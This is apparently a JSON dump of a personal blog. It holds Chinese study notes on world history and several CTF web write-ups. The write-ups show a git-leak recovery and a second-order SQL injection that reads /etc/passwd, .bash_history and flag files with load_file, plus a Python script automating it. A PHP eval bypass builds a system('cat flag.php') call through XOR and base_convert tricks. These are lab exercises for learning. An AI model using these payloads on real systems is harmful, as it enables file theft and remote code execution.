农民只能携带轻武器打仗，武士地位垄断青铜冶铸业，阶级矛盾与分化尖锐。 两性地位:：重男轻女。 阴阳世界观。 游牧民族获得权力question 公元前第二个千年中，所有古代文明纷纷崩溃的原因： 内因 - 高度垄断武器：各个古代文明内部的虚弱 - 黄铜&amp;青铜珍贵稀少，不能用来大规模制造武器装备，同时君主，政治，军事集团垄断了武器，只有少数金字塔顶尖的人掌握武器，在全员面对外敌时无法得到动员。 主要作用 - 游牧民族：南部沙漠地带的闪米特人，欧亚大草原西部的印欧人，大草原东部的蒙古-突厥人。 民族大迁徙 原因：大草原西部居住的印欧人和大草原东部居住的蒙古-突厥人中间隔着一条分界线，即阿尔泰山脉&amp;天山山脉，分界线以西气候条件恶劣，导致历史发展不平衡，出现了一次旷日持久，影响深远，由东向西的民族大迁徙。 大草原东部的各民族或以难民身份，或以征服者身份，前赴后继地向西推进。 大草原西部民族组成状况发生变化(始于公元前1000年末，终结于中世纪结束)： 原先高加索人种占优势变为蒙古人种占优势 此后，将斯拉夫语的俄罗斯人利用西方技术的滑膛枪-火炮(后利用机关枪-铁路)，使种族演变再次逆转。 最后闪米特人大致占据了从地中海到底格里斯河，从托罗斯山脉到亚丁之间的广大地区。 公元前第二个千年 - 力量对比发生变化 马的驯养与冶铁技术，使得游牧民族获得了新的作战能力。 游牧文明摧毁古代文明 第一次入侵(公元前1700 - 公元前1500) 青铜武器 &amp; 马拉的战车 第二次入侵(公元前1200 - 公元前1100) 铁制武器 &amp; 骑马 影响 除中东外的帝国均被摧毁 question 中东为什么没有被摧毁？ 中东文明植根深厚，社会文明区域广阔，不可能同时被全部征服/摧毁 侵略中东的多为半文明国家，这些入侵者在征服的过程也逐渐被同化了。 各个文明被侵略情况中东 第一次蛮族入侵(公元前1700) ​ 公元前1500年时第一次蛮族入侵浪潮平息，三大帝国(北方的赫梯帝国 &amp; 南方的埃及帝国 &amp; 东方的亚述帝国)由此形成。 第二次蛮族入侵(公元前1200) ​ 三只闪米特人趁赫梯帝国与埃及帝国的相互征战而入侵，腓尼基人占据了地中海沿岸，希伯来人占据了巴勒斯坦和叙利亚，阿拉米人占据了叙利亚。 结束 公元前1100，亚述第二帝国拥有铁制武器，训练有素的军队，有效的官僚机构，以及破城槌，到公元前7世纪时定都尼尼微，统治领域囊括整个美索不达米亚，小亚细亚，叙利亚，巴勒斯坦与埃及。 但是由于其过扩与被征服民族的反抗导致了公元前612年亚述第二帝国被摧毁。之后波斯人继承了亚述人，成立了中东史上最大的波斯帝国。在国王居留士(公元前550-公元前229)，波斯人利用亚述人的军事力量征服了南抵尼罗河，北达印度河的所有中东地区(中东第一次得到统一)。 希腊概述 亚该亚人的入侵史 与公元前20世纪入侵希腊，当时亚该亚主要手持青铜武器，发展水平远落后于属于希腊米诺斯文明的克里特岛人。但其于公元前17世纪时亚该亚人已经吸收了米诺斯文化，且从色萨利到伯罗奔尼撒半岛南端的广大地区建立了许多小王国。 迈锡尼 - 伯罗奔尼撒半岛(离克里特半岛最近的居留地)的中心，即迈锡尼文明，设有牢固的防御工事，其也建立了一股强大的海军力量，并且瓦解了克里特岛在希腊半岛上的经济霸权，在公元前15世纪洗劫了克里特岛(克诺索斯被攻占)。 迈锡尼人的入侵，加上一连串的大地震，导致米诺斯文明与公元前1150已灭绝。 并且，亚该亚人遭受了与米诺斯人一样的命运，多里安人利用铁制武器攻占了迈锡尼的城堡与城市，希腊又倒退回了农业与畜牧业为主的经济形态。(黑暗时代直到公元前800年各城邦国家崛起) 希腊难民 希腊公社 公社均由贵族家庭及平民组成。 前者占统治地位，有权领导战争。 后者由自耕农，佃农，为数不多的工匠，雇工与奴隶组成。 地位最高的是国王，其权威取决于他指挥战争与领导贵族院会议的才能。 入侵希腊的印欧语系普遍采用这些简单的制度(表名希腊城邦政府机构尚处于萌芽状态) 印度 公元前1500年时被游牧民族(自称雅利安人，属印欧语系)推翻，游牧凭借铁制武器&amp;马拉战车摧毁了这个铜制武器&amp;牛拉战车的腐朽的帝国。 公元前第二个千年后半叶(公元前1500至公元前1000？)，印度河流域形成了一个原始的新社会(雅利安人) 新社会特征 吃牛肉，不将牛作为崇拜的对象；喝烈酒，而不将其舍弃。 有阶级，无种姓，祭司居于贵族之下。 中国第一次入侵 公元前1500年，由青铜武器的战车兵入侵了北部黄河流域，但由于游牧被同化，所以并没有造成文化终止。 第二次入侵 公元前1027年，朝代由商入周，入侵的周朝并没有改变商朝的制度，社会阶级(贵族武士、农民)，分封制并没有被取缔(甚至分封制更为明显)。 第三次入侵 公元前771年，周都城被“蛮族”入侵，被迫迁都到洛阳，史称西周&amp;东周。 东周时，周王的势力渐弱，之后只起到了高级祭司的作用。 东周的文化发展：","tags":[{"name":"全球通史","slug":"全球通史","permalink":"https://v25bh145.github.io/tags/%E5%85%A8%E7%90%83%E9%80%9A%E5%8F%B2/"}]},{"title":"2.新石器时代-全球通史","date":"2020-11-24T18:05:00.000Z","path":"2020/11/25/hobbies/history/全球通史/2.新石器时代-全球通史/","text":"新石器时代preview 使用磨制石器代替打制石器。 食物来源大多数靠栽培植物与蓄养动物。 question1: 人类早已知道植物的生长方式，可为什么那么久还在依靠采摘野生果实维生？ 作为游牧群体，其经常处于迁徙过程中，因此不能形成人丁兴旺的大家族。 在正常情况下，靠捕猎为生的原始人不但拥有充足的食物，且品种丰富。对比而知。 question2 既然这样，那么人类为什么还会转成农业文明呢？ 由于人群爆炸式增长，导致生存迁徙空间被不断压缩。 就每平方米能养活的人口而言，农业远远超过于食物采集。 农业农业起源地 从植物栽培到农业革命: 公元前9000 - 公元前7500 谷物的分布类型 耕种技术 刀耕火种 削一圈树干，中断树汁的输送，之后点燃树木，留下的空地用于种植，同时灰烬用作废料。 梯田农业 由于山区洪水泛滥，用石墙来阻隔农田，之后洪水冲刷下来的泥土在石墙后堆积，当泥土多到足够积满梯田时，即可使用这些泥土来种田，同时还可以在石墙后开水口来使用洪水灌溉农田。 培高田地农业 泥质平台的泥土取决于开挖渠道的泥土 畜牧业 公元前1500 - 公元前1000 兴起 生活 新石器时代的村庄 + 部落取代了旧石器时代的流浪团体(家庭 + 部落)成为了人类最基本的经济文化单位。 缺陷 农业生产效率极低，人人都需要付出艰辛的劳动。 瘟疫横行，涝旱成灾。 食物品种不足，营养不良。 寿命短但出生率高。 进步 陶器的制作技术，上釉密封技术。 亚麻，棉花，大麻等等纤维类植物的应用，锭子与织机的发明。 坚固 - 宽敞的住房。 政治组织 - 部落政治组织 一个部落由一个地区若干个村庄的居民组成。 每个部落由独特的语言以及风俗习惯。 已有强有力的首领，原始贵族，平民的分化，但分化界限模糊，没有后来文明所特有的基于阶级的排外性(没有阶级斗争)。 村落： 最基本的社会单位是由若干对夫妻和他们的孩子们组成的大家庭。(加上外来的流浪者) 平等主义: 分工明确，居民之间经济平等，社会地位平等，每个家庭都拥有生产生活用品所必须的技能和工具，且每个家庭都有权使用维持生活所必不可少的基本自然资源。 限制 - 生产力被阻碍，生产数量只满足每个家庭有限的传统需要，没有追求生产剩余产品的动力。 (小农经济) 一个典型的部落成员，每年的工作时间少于现代人，并且工作对成员来说是一件愉快的事 根本原因： 他是一位社会平等成员的资格，以丈夫 父亲 兄弟 或 村社成员的身份去进行劳动或从事生产活动。 工作不是为了谋生而必须忍受的一种不幸，而是亲属关系和村落关系的伴随物。 帮助其他人干农活，不是因为期望对方给予农作物，而是仅仅由于亲属关系。(行为不是由利益驱动的，仅仅出于人道主义) 两性关系 - 女人男人一样享有自由使用土地的权利，享有使用村庄用品的权利。 宗教新的宗教信仰开始出现，人们开始认为这些神灵背后有一个造物主。 农业革命的影响 人口增加导致了农业革命，而农业革命反过来又导致了更大规模的人口增长。 对于采集者： 不过更常见的形式是，农业移民和当地的食物采集者互相通婚，产生杂交人种，之后随着人口和压力的再度积累，新的杂交人种想更新的地方迁徙，再去和更远的当地采集者通婚，导致农业传播到了全球各地。 末 - 人性的本质","tags":[{"name":"全球通史","slug":"全球通史","permalink":"https://v25bh145.github.io/tags/%E5%85%A8%E7%90%83%E9%80%9A%E5%8F%B2/"}]},{"title":"1.旧石器时代-全球通史","date":"2020-11-23T08:09:00.000Z","path":"2020/11/23/hobbies/history/全球通史/1.旧石器时代-全球通史/","text":"序(笔记) 最近闲来无事(真的闲吗)，想入门人文历史，为了先大体了解了解历史的框架，就先看起来了全球通史，在这里做做笔记，摘抄之类。 这条是之后加的：在前几篇笔记中发现截图略多，不方便进行内容总结，所以在后面适当减少了截图所占的篇幅。 序盲目的消费主义与物质主义的成因 资本主义的形态 自由企业制度 福利国家 - 工人参与决策 =&gt; 纳维亚形态 国家计划经济 - 终身雇佣 - 政府资助 =&gt; 亚洲经济形态 一. 史前人类1. 食物采集者(旧石器时代)文化的产生 技术产生的速度大于社会变革的速度 =&gt; 人类的主要矛盾 旧石器时代大体情况 狩猎团体的首领 - 权力受到严格的限制(强制性的权利，推举制)，一般为狩猎本领出众的年轻人 首领不会运用全力而是通过自身的影响来完成自己的职责，当时并没有任何制度规定人可以把自己的意志强加于他人 司仪 - 熟悉宗教仪式的老人，自然推举 家庭是社会的基本组织单位，通常允许一夫多妻(但实例极少) 男女平等，因为女性被认为获取食物的贡献等同于男性，男性拥有武器，但是并不使用武器来恐吓或镇压女人 部落之间拥有很亲密的血族关系。每个人都要对他人承担责任，享有同样的权利和特权 社会拥有个人恩怨，但缺乏维持大规模战争所必需的人力和物力 总结: 社会组织为协作，家族与部落是相互协作的团体，为共同生存进行着艰苦的斗争 思想 =&gt; 保守 宗教 有巫师&amp;巫医，但是还没有神学，对上帝和神灵概念模糊，宗教没有被用于控制社会 艺术 洞穴壁画 发明创造 疾病 不完全依赖于巫术，懂得利用夹板进行断肢再续，懂得利用止血带，绑系绷带，服用药膏，放血与灌肠 社会组织 会杀死不遵守部落传统的人，且会在食物短缺时杀死儿童与身体虚弱的人，狼性思维 这样会导致一个部落发展基本停滞，将轻易被农业革命带来的农民逼退 人口暴涨 在旧石器时代，由于实用技术的发展，导致人口急剧增长(42倍以上) 由旧石器时代的发展进程得出的人口统计模式 种族差别 原因: 种族迁徙 + 环境不同 特征: 人群分野发生得很晚 =&gt; 共同祖先 高加索种人分布在欧洲 北非 东非和中东，且正在深入到印度和中亚 黑种人分布在撒哈拉沙漠以及沙漠以南地带 俾格米人-布希曼人分布在非洲其余的地方 &amp; 印度和东南亚的森林地带 澳大利亚种人分布在印度，东南亚的的其他地区以及澳大利亚 蒙古人种分布在东亚以及南北美洲 虽然种族分布类似，但是人种分布已经发生了根本性的变化：(原因 =&gt; 发展速度赶不上技术革命)","tags":[{"name":"全球通史","slug":"全球通史","permalink":"https://v25bh145.github.io/tags/%E5%85%A8%E7%90%83%E9%80%9A%E5%8F%B2/"}]},{"title":"CTF笔记-WEB攻防-08","date":"2020-10-21T07:40:00.000Z","path":"2020/10/21/coding/ctf/ctf笔记-08/","text":"comment前置知识 git泄露 git版本控制 git版本恢复 sql二次注入(注释式构造) 利用mysql函数load_file()读取文件( + 读取二进制文件使用hex()函数) /etc/passwd关于用户信息的泄露 linux系统的历史指令文件(需有打开控制台的权限，与5.联合使用) .DS_Store泄露 入题 进入页面，只有”发帖”可以点，随便填点什么之后发现需要登录，跳转到了/login.php： burp爆破发现placeholder有提示，上burpsuite使用数字爆破一下。 嘛不过自己在爆破的时候随便猜了一下，发现是666然后过了 之后再用dirsearch扫一下: 123456789101112131415161718192021222324252627282930313233343536373839[02:49:02] Starting:[02:49:03] 403 - 289B - /.git/[02:49:03] 200 - 17B - /.git/COMMIT_EDITMSG[02:49:03] 403 - 298B - /.git/branches/[02:49:03] 200 - 92B - /.git/config[02:49:03] 200 - 145B - /.git/index[02:49:03] 200 - 73B - /.git/description[02:49:03] 403 - 295B - /.git/hooks/[02:49:03] 403 - 294B - /.git/info/[02:49:03] 200 - 240B - /.git/info/exclude[02:49:03] 403 - 294B - /.git/logs/[02:49:03] 301 - 333B - /.git/logs/refs -&gt; http://220.249.52.133:48820/.git/logs/refs/[02:49:03] 301 - 339B - /.git/logs/refs/heads -&gt; http://220.249.52.133:48820/.git/logs/refs/heads/[02:49:03] 200 - 168B - /.git/logs/refs/heads/master[02:49:03] 403 - 297B - /.git/objects/[02:49:03] 403 - 294B - /.git/refs/[02:49:03] 301 - 334B - /.git/refs/heads -&gt; http://220.249.52.133:48820/.git/refs/heads/[02:49:03] 200 - 41B - /.git/refs/heads/master[02:49:03] 301 - 333B - /.git/refs/tags -&gt; http://220.249.52.133:48820/.git/refs/tags/[02:49:03] 403 - 298B - /.htaccess.bak1[02:49:03] 403 - 298B - /.htaccess.orig[02:49:03] 403 - 300B - /.htaccess.sample[02:49:03] 403 - 298B - /.htaccess.save[02:49:03] 403 - 296B - /.htaccessBAK[02:49:03] 403 - 296B - /.htaccessOLD[02:49:03] 403 - 297B - /.htaccessOLD2[02:49:03] 403 - 295B - /.httr-oauth[02:49:04] 403 - 288B - /.php[02:49:11] 301 - 322B - /css -&gt; http://220.249.52.133:48820/css/[02:49:12] 301 - 324B - /fonts -&gt; http://220.249.52.133:48820/fonts/[02:49:12] 200 - 7KB - /index.php[02:49:12] 200 - 7KB - /index.php/login/[02:49:13] 301 - 321B - /js -&gt; http://220.249.52.133:48820/js/[02:49:13] 200 - 2KB - /login.php[02:49:14] 200 - 0B - /mysql.php[02:49:16] 403 - 297B - /server-status[02:49:16] 403 - 298B - /server-status/Task Completed git泄露好家伙，git泄露了，使用githacker下载下来.git文件 发现do_write.php几乎什么也没有，扑了个空？ git 恢复历史版本 以后在面对git泄露的漏洞时，一定要使用git log –reglog查看下历史文件，挨个恢复一遍看看 需要注意到的坑： GitHacker的运行环境为linux 当单次执行时，需要输入以下代码： 1234git initgit add -Agit commit -m \"qwq\"python GitHacker.py [url] 在获取成功后，使用以下指令： 1234567cd [that ip]# 需要进入下载好的文件夹再使用git，否则没有效果git log --reglog# 查看版本号git reset --hard [version]# 恢复历史记录# git reset --hard 2393e10f134536b2141d97819d73a68dec417106 我们终于拿到了关于SQL注入的源码了，接下来让我们开始代码审计 吧。 SQL-二次注入这是截下来的源码： 123456789101112131415161718192021222324252627282930313233343536373839404142434445&lt;?phpinclude \"mysql.php\";session_start();if($_SESSION['login'] != 'yes')&#123; header(\"Location: ./login.php\"); die();&#125;if(isset($_GET['do']))&#123;switch ($_GET['do'])&#123;case 'write': $category = addslashes($_POST['category']); $title = addslashes($_POST['title']); $content = addslashes($_POST['content']); $sql = \"insert into board set category = '$category', title = '$title', content = '$content'\"; $result = mysql_query($sql); header(\"Location: ./index.php\"); break;case 'comment': $bo_id = addslashes($_POST['bo_id']); $sql = \"select category from board where id='$bo_id'\"; $result = mysql_query($sql); $num = mysql_num_rows($result); if($num&gt;0)&#123; $category = mysql_fetch_array($result)['category']; $content = addslashes($_POST['content']); $sql = \"insert into comment set category = '$category', content = '$content', bo_id = '$bo_id'\"; $result = mysql_query($sql); &#125; header(\"Location: ./comment.php?id=$bo_id\"); break;default: header(\"Location: ./index.php\");&#125;&#125;else&#123; header(\"Location: ./index.php\");&#125;?&gt; 其中，我们需要注意的是这两段代码，我们可以从中尝试构造 12345678$sql = \"insert into board set category = '$category', title = '$title', content = '$content'\"; $sql = \"insert into comment set category = '$category', content = '$content', bo_id = '$bo_id'\"; 二次注入 - /**/构造我们可以尝试插入这样的字符串来构造SQL注入： 12345678# write页$category = '3\\', content=database(),/*';# 3', content = database(),/*# comment页$content = '*/#';# */## 最终的SQL query语句:# select into comment where category = 3', content = database(),/* and content = ...*/ and bo_id = ... 1234563&apos;, content = database(),/*# ctf3&apos;, content = (select group_concat(table_name) from information_schema.tables where table_schema = &quot;ctf&quot;),/*# board,comment,user3&apos;, content = (select group_concat(column_name) from information_schema.columns where table_schema = &quot;ctf&quot;),/*# id,category,title,content,id,bo_id,category,content,id,username,password 数据库里的字段都是已知的，看来并不能从中找到flag。 13&apos;, content = load_file(&quot;/var/www/html/flag.php&quot;),/* 读取不着，要换个思路了。 /etc/passwd尝试使用load_file进行查询，读入linux内文件： 1233&apos;, content = load_file(&quot;/etc/passwd&quot;),/*root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin libuuid:x:100:101::/var/lib/libuuid: syslog:x:101:104::/home/syslog:/bin/false mysql:x:102:105:MySQL Server,,,:/var/lib/mysql:/bin/false www:x:500:500:www:/home/www:/bin/bash 看到了/bin/bash，说明当前用户拥有使用终端的权限。 /home/www/.bash_history (在已知拥有终端权限后)1233&apos;, content = load_file(&quot;/home/www/.bash_history&quot;),/*cd /tmp/ unzip html.zip rm -f html.zip cp -r html /var/www/ cd /var/www/html/ rm -f .DS_Store service apache2 start 发现.DS_Store文件泄露漏洞，开发者只删除了/var/www/html下的.DS_Store，并没有删除/tmp/html下的.DS_Store。 .DS_Store文件泄露 关于.DS_Store文件 简单来说，可以通过.DS_Store看文件目录 13&apos;, content = hex(load_file(&quot;/tmp/html/.DS_Store&quot;)),/* 得到16进制码，放入16进制-文本字符串转换工具中: flag(?)看到了flag.php，复制下来： 123flag_8946e1ff1ee3e40f.php3&apos;, content = hex(load_file(&quot;/tmp/html/flag_8946e1ff1ee3e40f.php&quot;)),/* flag 以为这题完了？诶，还没完呢~ 将flag提交，发现不正确，被忽悠了一手！ 再去/var/www/html目录下看看，又发现了另一个flag: 13&apos;, content = hex(load_file(&quot;/var/www/html/flag_8946e1ff1ee3e40f.php&quot;)),/* 提交这个flag，这下才对了。 后话因之前unfinish中二次注入的影响，导致我认为二次注入必须写python，使用ascii一个一个按照字母去出，虽然现在明白过来了，但是写的python脚本也不愿就此删掉了，还是放上来扒hhh 1234567891011121314151617181920212223242526272829303132333435363738import requestsimport re# payload = \"', content=ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema = 'ctf') from 1 for 1)), /*\"comment_url=\"http://220.249.52.133:30981/write_do.php?do=write\"write_url=\"http://220.249.52.133:30981/write_do.php?do=comment\"flag = \"\"headers_write = &#123; 'Cookie': 'PHPSESSID=1qvvpqhq0o3raukebj5s24f5d6'&#125;headers_comment = &#123; 'Cookie': 'PHPSESSID=1qvvpqhq0o3raukebj5s24f5d6'&#125;for i in range(1, 10000): category = \"', content=ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema = 'ctf') from %d for 1)), /*\"%i post_comment = &#123; 'category': category, 'title': \"\", 'content': \"\" &#125; r1 = requests.post(comment_url,data=post_comment,headers=headers_comment) content=\"*/#\" post_write = &#123; 'content': content, 'bo_id': i &#125; r2 = requests.post(write_url, data=post_write, headers=headers_write) match = re.search(r'&lt;p&gt;(\\d+)&lt;/p&gt;&lt;/div&gt;&lt;/div&gt;',r2.text) asc = match.group(1) print(asc) if asc == '0': break flag = flag + chr(int(asc))print(flag)","tags":[{"name":"ctf-web","slug":"ctf-web","permalink":"https://v25bh145.github.io/tags/ctf-web/"},{"name":"CTF笔记-WEB攻防","slug":"CTF笔记-WEB攻防","permalink":"https://v25bh145.github.io/tags/CTF%E7%AC%94%E8%AE%B0-WEB%E6%94%BB%E9%98%B2/"}]},{"title":"CTF笔记-WEB攻防-08","date":"2020-10-21T07:40:00.000Z","path":"2020/10/21/coding/ctf/ctf笔记-09/","text":"love_math前置知识 php代码审计 进制转换 使用进制绕过字母 使用进制绕过所有ascii字符(除1xxxxxxx开头外) 使用’{}’绕过’[]’ (数组 奇淫技巧，对开发有思路帮助) 入题 进入页面即看到php代码，审计： php审计12345678910111213141516171819202122232425262728&lt;?phperror_reporting(0);//听说你很喜欢数学，不知道你是否爱它胜过爱flagif(!isset($_GET['c']))&#123; show_source(__FILE__);&#125;else&#123; //例子 c=20-1 $content = $_GET['c']; if (strlen($content) &gt;= 80) &#123; die(\"太长了不会算\"); &#125; $blacklist = [' ', '\\t', '\\r', '\\n','\\'', '\"', '`', '\\[', '\\]']; foreach ($blacklist as $blackitem) &#123; if (preg_match('/' . $blackitem . '/m', $content)) &#123; die(\"请不要输入奇奇怪怪的字符\"); &#125; &#125; //常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp $whitelist = ['abs', 'acos', 'acosh', 'asin', 'asinh', 'atan2', 'atan', 'atanh', 'base_convert', 'bindec', 'ceil', 'cos', 'cosh', 'decbin', 'dechex', 'decoct', 'deg2rad', 'exp', 'expm1', 'floor', 'fmod', 'getrandmax', 'hexdec', 'hypot', 'is_finite', 'is_infinite', 'is_nan', 'lcg_value', 'log10', 'log1p', 'log', 'max', 'min', 'mt_getrandmax', 'mt_rand', 'mt_srand', 'octdec', 'pi', 'pow', 'rad2deg', 'rand', 'round', 'sin', 'sinh', 'sqrt', 'srand', 'tan', 'tanh']; preg_match_all('/[a-zA-Z_\\x7f-\\xff][a-zA-Z_0-9\\x7f-\\xff]*/', $content, $used_funcs); foreach ($used_funcs[0] as $func) &#123; if (!in_array($func, $whitelist)) &#123; die(\"请不要输入奇奇怪怪的函数\"); &#125; &#125; //帮你算出答案 eval('echo '.$content.';');&#125; 大意：这个网站可以帮我们计算一些数学公式，其中只可以使用给出的函数，不支持除此以外的任何字母组合，只支持数字。 属于webshell类型的题目，需要我们找出可以绕过的漏洞。 base_convert在题目给出的网站中翻找时，看到了一个进制转换函数，突然想到高进制的数字是使用字母表示的，立刻去试了试： 123?c=base_convert(35,10,36)output=&gt;z 不错，找到了输入字母的方法。 之后我们需要找到调用php其他函数的方法，通过system函数来获取webshell。 尝试构造1目标函数：system(&quot;cat flag.php&quot;) 技巧1： 执行以变量为函数名的函数123456&lt;?phpfunction func ($var) &#123; echo $var;&#125;$c = \"func\";$c(1); 有一点要说明的是，对于echo函数，由于echo的原本形式是不加括号的，所以行不通。 技巧2： 执行以函数执行结果为函数名的函数123456&lt;?phpfunction func ($var) &#123; echo $var;&#125;//echo base_convert(\"func\", 36, 10); =&gt; 739560base_convert(739560, 10, 36)(1); 尝试-构造payload 目标中含有空格和’.’，没有办法使用以上两条技巧构造，我们还需要构造出全部字符。 技巧3：只用数字，进制函数与运算符[异或]构造出所有字符 =&gt; 异或构造的要求(重点)这里先放出异或的规则： 在php中对两个字符串进行异或运算时： 运算符会先将字符串全部通过ascii表转换为二进制再进行异或，将异或的结果再重新通过ascii表转换为字符串。 因此，理论上我们可以通过字母与数字来构造出ascii的所有字符。 再放上写好了的转换函数： 12345678910function str2ascii($str)&#123; $str = mb_convert_encoding($str, 'GB2312'); $change_after = ''; for ($i = 0; $i &lt; strlen($str); $i++) &#123; $temp_str = str_pad(base_convert(ord($str[$i]), 10, 2), 8, 0, STR_PAD_LEFT); $change_after = $change_after.$temp_str.\" \"; &#125; return strtoupper($change_after);&#125; e.g:尝试转换flag.php(练习)12echo str2ascii(\"flag.php\");// 01100110 01101100 01100001 01100111 00101110 01110000 01101000 01110000 这时直接强行使用数字和字母构造当然是不可行的，因为PHP处理输入的字符串，稍微总结了下规则： 在PHP中异或构造的要求： 必须只使用数字/字母构造(范围：0: 0011 0000 9: 0011 1010 a: 0110 0001 z: 0111 1010) 单个组合必须需要出现字母(在之后会使用进制转换函数构造)，不能出现纯数字的字符串。 字符串的开头不能是0(譬如说，1就可以)。 我们先尝试第一次构造： 1234// 01100110 01101100 01100001 01100111 00101110 01110000 01101000 01110000// 00110001 00110000 00110000 00110000 ******** ******** 00110000 ******** //num-two// 01010111 01011100 01010001 01010111 ******** ******** 01011000 ******** 其中*为不能构造的部分，这是就要考虑使用三次异或了： 12345// 01100110 01101100 01100001 01100111 00101110 01110000 01101000 01110000// 00110001 00110000 00110000 00110000 ******** 00110000 00110000 00110000 //three// 00110001 00110000 00110000 00110000 ******** 00110000 00110000 00110000// 01100110 01101100 01100001 01100111 ******** 01110000 01101000 01110000 可以看出，如果需要的字符串为大多数为字符构成，使用三次构造明显更加方便(前两次中都使用相同的字符，可以使前两次的异或结果为0，这是的结果值就等于第三次中的字符) 这时再试着构造‘.’的payload： 1234567//00101110 &apos;.&apos;//00110000 &apos;0&apos;//01110001 &apos;q&apos;//01000001 &lt;=//01101111 &apos;o&apos; 将字符随便组合一下，使其满足PHP异或构造的要求： 12345678// 01100110 01101100 01100001 01100111 00101110 01110000 01101000 01110000// 00110001 00110000 00110000 00110000 01101111 00110000 00110000 00110000//1000o000// 00110001 00110000 00110000 00110000 01110001 00110000 00110000 00110000//1000q000// 01100110 01101100 01100001 01100111 00110000 01110000 01101000 01110000//flag0php 1echo base_convert(78365283840, 10, 36)^base_convert(78365377152, 10, 36)^base_convert(1221806459149, 10, 36); 问题来了，输入超限了(可以回去看源代码，有对输入的字符串长度做限制)… 因此掌握了异或构造还不行，还需要其他的知识。 技巧4： 使用{}绕过[] 可以用{}来访问下标 123456789$p = [\"example1\", \"example2\"];$i = 0;$p2 = [\"key1\" =&gt; \"example1\", \"key2\" =&gt; \"example2\"];$i2 = \"key1\";//以下四个echo均会输出example1echo $p&#123;0&#125;;echo $p&#123;$i&#125;;echo $p2&#123;\"key1\"&#125;;echo $p2&#123;$i2&#125;; 甚至以下8个都是等效的: 123456789101112131415$p = [\"example1\", \"example2\"];$i = 0;$p2 = [\"key1\" =&gt; \"example1\", \"key2\" =&gt; \"example2\"];$i2 = \"key1\";$arr_name = \"p\";$arr_name2 = \"p2\";echo \"&lt;br&gt;1:\".$p&#123;0&#125;;echo \"&lt;br&gt;2:\".$p&#123;$i&#125;;echo \"&lt;br&gt;3:\".$p2&#123;\"key1\"&#125;;echo \"&lt;br&gt;4:\".$p2&#123;$i2&#125;;echo \"&lt;br&gt;5:\".$&#123;$arr_name&#125;&#123;0&#125;;echo \"&lt;br&gt;6:\".$&#123;$arr_name&#125;&#123;$i&#125;;echo \"&lt;br&gt;7:\".$&#123;$arr_name2&#125;&#123;\"key1\"&#125;;echo \"&lt;br&gt;8:\".$&#123;$arr_name2&#125;&#123;$i2&#125;; 最终的paylode思路(缩小$_GET[“c”]长度的 折 磨 过程) 我们可以通过访问$_GET[]数组来实现字母的输入，使用?0=system&amp;1=cat+flag.php&amp;c=\\$\\_GET{0}(\\$\\_GET{1})来实现 其中，_GET可以使用上述的异或构造方式来构造。 _GET payload payload1234567891011121314151617181920212223242526// 0: 0011 0000 9: 0011 1010// a: 0110 0001 z: 0111 1010GET TO ascii:01011111 01000111 01000101 01010100TWO:00110001 00110000 00110000 001100001 0 0 001101110 01110111 01110101 01100100n w u dPAYLOAD:00110001 01110111 00110000 001100001 w 0 001101110 00110000 01110101 01100100n 0 u dbase_convert(&quot;1w00&quot;, 36, 2);10101100001000000 base_convert(&quot;n0ud&quot;, 36, 2);100000110010000000101base_convert(&quot;10101100001000000&quot;, 2, 36)^base_convert(&quot;100000110010000000101&quot;, 2, 36);$&#123;base_convert(10101100001000000, 2, 36)^base_convert(100000110010000000101, 2, 36)&#125;&#123;0&#125;($&#123;base_convert(10101100001000000, 2, 36)^base_convert(100000110010000000101, 2, 36)&#125;&#123;1&#125;) 双超出长度限制…这时可以用变量替换一波，我们注意到字母会被屏蔽，但是关键字不会被屏蔽，所以我们可以用关键字做变量名(php中关键字名可以做变量名，只要有’$‘即可)，省下一倍字符: 123$p=base_convert(&quot;10101100001000000&quot;, 2, 36)^base_convert(&quot;100000110010000000101&quot;, 2, 36);$&#123;$p&#125;&#123;0&#125;($&#123;$p&#125;&#123;1&#125;);?0=system&amp;1=cat+flag.php&amp;c=$pi=base_convert(10101100001000000, 2, 36)^base_convert(100000110010000000101, 2, 36);$&#123;$pi&#125;&#123;0&#125;($&#123;$pi&#125;&#123;1&#125;) 还是太长了…可以再选择输入十进制而不是二进制: 123456base_convert(&quot;1w00&quot;, 36, 10);88128base_convert(&quot;n0ud&quot;, 36, 10);1074181?0=system&amp;1=cat+flag.php&amp;c=$pi=base_convert(88128,10,36)^base_convert(1074181,10,36);$&#123;$pi&#125;&#123;0&#125;($&#123;$pi&#125;&#123;1&#125;) 终于成功了awa，这题真的是各种巧妙的绕过啊。","tags":[{"name":"ctf-web","slug":"ctf-web","permalink":"https://v25bh145.github.io/tags/ctf-web/"},{"name":"CTF笔记-WEB攻防","slug":"CTF笔记-WEB攻防","permalink":"https://v25bh145.github.io/tags/CTF%E7%AC%94%E8%AE%B0-WEB%E6%94%BB%E9%98%B2/"}]},{"title":"CTF笔记-WEB攻防-07","date":"2020-10-20T09:30:00.000Z","path":"2020/10/20/coding/ctf/ctf笔记-07/","text":"bug 题目目前数据库有点问题，待之后好了补充 ics-07我们的工控云管理叕叒出问题啦，点开”项目管理”，进入之后看到最下面有一行”view source”，进入页面，开始审计php: 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647&lt;?php session_start();if (!isset($_GET[page])) &#123; show_source(__FILE__); die();&#125;if (isset($_GET[page]) &amp;&amp; $_GET[page] != 'index.php') &#123; include('flag.php');&#125;else &#123; header('Location: ?page=flag.php');&#125;if 